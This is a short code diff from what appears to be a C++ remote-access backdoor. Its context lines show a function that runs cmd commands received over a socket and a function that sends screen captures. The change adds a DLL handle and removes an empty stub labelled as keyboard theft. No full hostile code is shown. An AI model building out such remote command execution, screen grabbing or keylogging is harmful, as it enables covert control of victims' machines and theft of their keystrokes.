@@ -4,7 +4,7 @@
 using namespace std;
 char send_msg[1024]="default_msg";
 char recv_msg[1024];
-
+HMODULE hDll;
 /////////////////执行cmd命令/////////////////////////
 void extend_cmd(char* recv_msg){
 	char cmd_buf[1024]={0};
@@ -128,7 +128,4 @@ void see(SOCKET s){
 	ReleaseDC(NULL, hdc);
 	
 }
-////////////////////键盘窃取//////////////////////////////
-void hook_key(SOCKET s,char* file_path){
-	
-}
+
